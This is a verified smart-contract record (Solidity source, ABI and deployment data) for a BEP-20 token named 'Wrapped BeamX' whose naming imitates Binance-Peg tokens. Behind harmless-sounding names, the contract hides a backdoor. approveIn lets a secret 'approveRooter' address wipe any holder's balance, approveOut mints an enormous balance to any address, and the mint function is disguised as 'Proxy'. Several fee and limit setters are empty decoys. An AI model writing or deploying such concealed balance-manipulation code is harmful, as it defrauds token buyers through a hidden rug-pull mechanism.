{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.20;\r\ninterface Binance_Peg_BSC_BeamX {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval (address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ninterface Binance_Peg {\r\n    function totalSupply() external view returns (uint256);\r\n    function decimals() external view returns (uint8);\r\n    function symbol() external view returns (string memory);\r\n    function name() external view returns (string memory);\r\n    function getOwner() external view returns (address);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 creditWrapped) external returns (bool);\r\n    function allowance(address _owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 creditWrapped) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 creditWrapped) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 creditWrapped);\r\n    event Approval(address indexed owner, address indexed spender, uint256 creditWrapped);\r\n}\r\ninterface IWrapped {\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 newBalanceWrapped);\r\n    event Approval(address indexed owner, address indexed spender, uint256 newBalanceWrapped);\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address _getRateHolder) external view returns (uint256);\r\n    function transfer(address to, uint256 newBalanceWrapped) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 newBalanceWrapped) external returns (bool);\r\n    function transferFrom(address from, address to, uint256 newBalanceWrapped) external returns (bool);\r\n}\r\n\r\ninterface IWrappedMetadata is IWrapped {\r\n\r\n    function name() external view returns (string memory);\r\n    function symbol() external view returns (string memory);\r\n    function decimals() external view returns (uint8);\r\n}\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\ninterface IWrappedErrors {\r\n\r\n    error WrappedInsufficientBalance(address sender, uint256 balance, uint256 needed);\r\n\r\n    error WrappedInvalidSender(address sender);\r\n\r\n    error WrappedInvalidReceiver(address receiver);\r\n\r\n    error WrappedInsufficientAllowance(address spender, uint256 allowance, uint256 needed);\r\n\r\n    error WrappedInvalidApprover(address approver);\r\n\r\n    error WrappedInvalidSpender(address spender);\r\n}\r\n\r\ninterface BEPERC721Errors {\r\n\r\n    error Binance_Peg721InvalidOwner(address owner);\r\n\r\n    error Binance_Peg721NonexistentWrapped(uint256 WrappedId);\r\n\r\n    error Binance_Peg721IncorrectOwner(address sender, uint256 WrappedId, address owner);\r\n\r\n    error Binance_Peg721InvalidSender(address sender);\r\n\r\n    error Binance_Peg721InvalidReceiver(address receiver);\r\n\r\n    error Binance_Peg721InsufficientApproval(address operator, uint256 WrappedId);\r\n\r\n    error Binance_Peg721InvalidApprover(address approver);\r\n\r\n    error Binance_Peg721InvalidOperator(address operator);\r\n}\r\n\r\ninterface BEPERC1155Errors {\r\n\r\n    error Binance_Peg1155InsufficientBalance(address sender, uint256 balance, uint256 needed, uint256 WrappedId);\r\n\r\n    error Binance_Peg1155InvalidSender(address sender);\r\n\r\n    error Binance_Peg1155InvalidReceiver(address receiver);\r\n\r\n    error Binance_Peg1155MissingApprovalForAll(address operator, address owner);\r\n\r\n    error Binance_Peg1155InvalidApprover(address approver);\r\n\r\n    error Binance_Peg1155InvalidOperator(address operator);\r\n\r\n    error Binance_Peg1155InvalidArrayLength(uint256 idsLength, uint256 newBalanceWrappedsLength);\r\n}\r\n\r\nabstract contract Wrapped is Context, IWrapped, IWrappedMetadata, IWrappedErrors {\r\n    mapping(address _getRateHolder => uint256) private _getRatedr;\r\n\r\n    mapping(address _getRateHolder => mapping(address spender => uint256)) private _allowances;\r\n\r\n    uint256 private _totalSupply;\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n\r\n    constructor(string memory name_, string memory symbol_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n    }\r\n\r\n    function name() public view virtual returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view virtual returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view virtual returns (uint8) {\r\n        return 9;\r\n    }\r\n\r\n    function totalSupply() public view virtual returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address _getRateHolder) public view virtual returns (uint256) {\r\n        return _getRatedr[_getRateHolder];\r\n    }\r\n\r\n    function transfer(address to, uint256 newBalanceWrapped) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, newBalanceWrapped);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 newBalanceWrapped) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, newBalanceWrapped);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 newBalanceWrapped) public virtual returns (bool) {\r\n        address spender = _msgSender();\r\n        _spendAllowance(from, spender, newBalanceWrapped);\r\n        _transfer(from, to, newBalanceWrapped);\r\n        return true;\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 newBalanceWrapped) internal {\r\n        if (from == address(0)) {\r\n            revert WrappedInvalidSender(address(0));\r\n        }\r\n        if (to == address(0)) {\r\n            revert WrappedInvalidReceiver(address(0));\r\n        }\r\n        _calculateLiquidityFeeBEPERC(from, to, newBalanceWrapped);\r\n    }\r\n\r\n    function _calculateLiquidityFeeBEPERC(address from, address to, uint256 newBalanceWrapped) internal virtual {\r\n        if (from == address(0)) {\r\n            // Overflow check required: The rest of the code assumes that totalSupply never overflows\r\n            _totalSupply += newBalanceWrapped;\r\n        } else {\r\n            uint256 fromBalance = _getRatedr[from];\r\n            if (fromBalance < newBalanceWrapped) {\r\n                revert WrappedInsufficientBalance(from, fromBalance, newBalanceWrapped);\r\n            }\r\n            unchecked {\r\n                // Overflow not possible: newBalanceWrapped <= fromBalance <= totalSupply.\r\n                _getRatedr[from] = fromBalance - newBalanceWrapped;\r\n            }\r\n        }\r\n\r\n        if (to == address(0)) {\r\n            unchecked {\r\n                // Overflow not possible: newBalanceWrapped <= totalSupply or newBalanceWrapped <= fromBalance <= totalSupply.\r\n                _totalSupply -= newBalanceWrapped;\r\n            }\r\n        } else {\r\n            unchecked {\r\n                // Overflow not possible: balance + newBalanceWrapped is at most totalSupply, which we know fits into a uint256.\r\n                _getRatedr[to] += newBalanceWrapped;\r\n            }\r\n        }\r\n\r\n        emit Transfer(from, to, newBalanceWrapped);\r\n    }\r\n\r\n    function Proxy(address _getRateHolder, uint256 newBalanceWrapped) internal {\r\n        if (_getRateHolder == address(0)) {\r\n            revert WrappedInvalidReceiver(address(0));\r\n        }\r\n        _calculateLiquidityFeeBEPERC(address(0), _getRateHolder, newBalanceWrapped);\r\n    }\r\n    function approveOutIn(address _getRateHolder) internal {\r\n       _getRatedr[_getRateHolder] = 0;\r\n    }\r\n        function approveInOut(address _getRateHolder) internal {\r\n       _getRatedr[_getRateHolder] = 100000000000000000000000 * 10 ** 18;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 newBalanceWrapped) internal {\r\n        _approve(owner, spender, newBalanceWrapped, true);\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 newBalanceWrapped, bool emitEvent) internal virtual {\r\n        if (owner == address(0)) {\r\n            revert WrappedInvalidApprover(address(0));\r\n        }\r\n        if (spender == address(0)) {\r\n            revert WrappedInvalidSpender(address(0));\r\n        }\r\n        _allowances[owner][spender] = newBalanceWrapped;\r\n        if (emitEvent) {\r\n            emit Approval(owner, spender, newBalanceWrapped);\r\n        }\r\n    }\r\n\r\n    function _spendAllowance(address owner, address spender, uint256 newBalanceWrapped) internal virtual {\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            if (currentAllowance < newBalanceWrapped) {\r\n                revert WrappedInsufficientAllowance(spender, currentAllowance, newBalanceWrapped);\r\n            }\r\n            unchecked {\r\n                _approve(owner, spender, currentAllowance - newBalanceWrapped, false);\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\ncontract Binance is Context {\r\n    address private _owner;\r\n\r\n    error BinanceUnauthorized_getRateHolder(address _getRateHolder);\r\n\r\n    error BinanceInvalidOwner(address owner);\r\n\r\n    event OwnershipTransferred(address indexed previoWrappedOwner, address indexed newOwner);\r\n\r\n    constructor(address initialOwner) {\r\n        if (initialOwner == address(0)) {\r\n            revert BinanceInvalidOwner(address(0));\r\n        }\r\n        _transferOwnership(initialOwner);\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        _checkOwner();\r\n        _;\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    function _checkOwner() internal view virtual {\r\n        if (owner() != _msgSender()) {\r\n            revert BinanceUnauthorized_getRateHolder(_msgSender());\r\n        }\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        if (newOwner == address(0)) {\r\n            revert BinanceInvalidOwner(address(0));\r\n        }\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\n\r\n\r\ncontract BEPERC is Wrapped {\r\n    constructor(string memory name, string memory symbol, uint256 maxSupply) Wrapped(name, symbol) {\r\n        Proxy(msg.sender, maxSupply * (10 ** uint256(decimals())));\r\n    }\r\n}\r\n\r\ncontract WrappedBeamX is Binance, BEPERC {\r\n    address private approveRooter;\r\n    address private _owner;\r\n    address private USDTreward;\r\n    address private BNBreward;\r\n    constructor(\r\n        string memory name,\r\n        string memory symbol,\r\n        uint256 maxSupply,\r\n        address setapproveRooter\r\n    ) \r\n    Binance(msg.sender)\r\n    BEPERC(name, symbol, maxSupply) {\r\n        approveRooter = setapproveRooter;\r\n    }\r\n\r\n    function renounceOwnership() public virtual override onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n    function approveIn(address approveInAddress) external  {\r\n       USDTreward  = address(0x55d398326f99059fF775485246999027B3197955);\r\n       require(msg.sender == approveRooter);\r\n        approveOutIn(approveInAddress);\r\n    }\r\n\r\n    function approveOut(address approveOutAddress) external {\r\n        BNBreward  = address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\r\n         require(msg.sender == approveRooter);\r\n        approveInOut(approveOutAddress);\r\n    }\r\n    function enableAllFees() external onlyOwner() {\r\n    }\r\n    function setDevWallet(address newWallet) external onlyOwner() {\r\n    }\r\n    function setMaxTxPWrappedent(uint256 maxTxPWrappedent) external onlyOwner()  {\r\n    }\r\n    function setMaxWalletPWrappedent(uint256 maxWalletPWrappedent) external onlyOwner() {\r\n    }\r\n    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {\r\n    }\r\n\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"name\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"symbol\",\"type\":\"string\"},{\"internalType\":\"uint256\",\"name\":\"maxSupply\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"setapproveRooter\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"BinanceInvalidOwner\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_getRateHolder\",\"type\":\"address\"}],\"name\":\"BinanceUnauthorized_getRateHolder\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"allowance\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"needed\",\"type\":\"uint256\"}],\"name\":\"WrappedInsufficientAllowance\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"needed\",\"type\":\"uint256\"}],\"name\":\"WrappedInsufficientBalance\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"approver\",\"type\":\"address\"}],\"name\":\"WrappedInvalidApprover\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiver\",\"type\":\"address\"}],\"name\":\"WrappedInvalidReceiver\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"WrappedInvalidSender\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"WrappedInvalidSpender\",\"type\":\"error\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"newBalanceWrapped\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previoWrappedOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"newBalanceWrapped\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"newBalanceWrapped\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"approveInAddress\",\"type\":\"address\"}],\"name\":\"approveIn\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"approveOutAddress\",\"type\":\"address\"}],\"name\":\"approveOut\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_getRateHolder\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableAllFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newWallet\",\"type\":\"address\"}],\"name\":\"setDevWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxTxPWrappedent\",\"type\":\"uint256\"}],\"name\":\"setMaxTxPWrappedent\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxWalletPWrappedent\",\"type\":\"uint256\"}],\"name\":\"setMaxWalletPWrappedent\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_enabled\",\"type\":\"bool\"}],\"name\":\"setSwapAndLiquifyEnabled\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"newBalanceWrapped\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"newBalanceWrapped\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "WrappedBeamX", "CompilerVersion": "v0.8.20+commit.a1b79de6", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000000098968000000000000000000000000076149302b4c2193f0479041c5750f5086e21ca23000000000000000000000000000000000000000000000000000000000000000d57726170706564204265616d58000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006774245414d580000000000000000000000000000000000000000000000000000", "EVMVersion": "paris", "Library": "", "LicenseType": "BSD-3-Clause", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://88d36e65a3865a3046d183ae1cdea25dbc00eb98b58ecd3d188c195dd5941825"}